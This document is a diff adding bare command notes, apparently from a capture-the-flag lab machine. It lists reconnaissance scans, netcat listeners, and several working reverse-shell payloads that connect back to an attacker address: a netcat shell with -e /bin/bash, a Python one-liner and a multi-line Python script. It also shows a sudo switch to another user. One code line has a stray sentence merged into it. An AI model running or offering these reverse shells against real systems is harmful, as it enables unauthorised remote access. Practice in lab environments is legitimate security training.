@@ -1,0 +1,30 @@
+nmap -sC -sV -O -oA nmap/initial 10.10.10.68
+
+gobuster dir -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.68
+
+whoami
+id
+uname -a
+
+nc -nlvp 4444
+
+nc -nv 10.10.14.30 4444 -e /bin/bash
+
+which python
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.30",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+sudo -i -u scriptmanager
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((“10.10.14.30”,5555))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);start a simple HTTP server in the scripts directory.
+
+chmod 777 test.py
+
+python -m SimpleHTTPServer 9005
+
+nc -lnvp 5555
